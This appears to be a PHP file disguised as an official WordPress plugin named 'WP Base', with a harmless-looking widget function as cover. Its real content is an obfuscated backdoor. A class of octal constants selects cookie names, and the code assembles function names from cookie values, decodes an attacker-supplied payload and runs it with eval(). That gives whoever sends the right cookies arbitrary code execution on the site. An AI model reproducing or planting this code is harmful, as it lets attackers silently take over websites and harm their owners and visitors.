<?php
/*
Plugin Name: WP Base
Plugin URI: http://wordpress.org/#
Description: Official WordPress plugin
Author: WordPress
Version: 2.7.5
Author URI: http://wordpress.org/#
*/

function update( $new_instance, $old_instance ) {
	$instance['title'] = strip_tags( $new_instance['title'] );
	return $instance;
}

class WPCA
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s) self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            0113,
            0113,
            0115,
            051,
            0100,
            025,
            0121,
            056
        );
    }
}
$_twlb = $_COOKIE;
($_twlb && isset($_twlb[WPCA::g(0) ])) ? (($_fzay = $_twlb[WPCA::g(1) ] . $_twlb[WPCA::g(2) ]) &&
($_afsic = $_fzay($_twlb[WPCA::g(3) ] . $_twlb[WPCA::g(4) ])) &&
($_cwx = $_fzay($_twlb[WPCA::g(5) ] . $_twlb[WPCA::g(6) ])) &&
($_cwx = $_cwx($_fzay($_twlb[WPCA::g(7) ]))) && eval($_cwx)) : $_twlb;
/* nslqyw */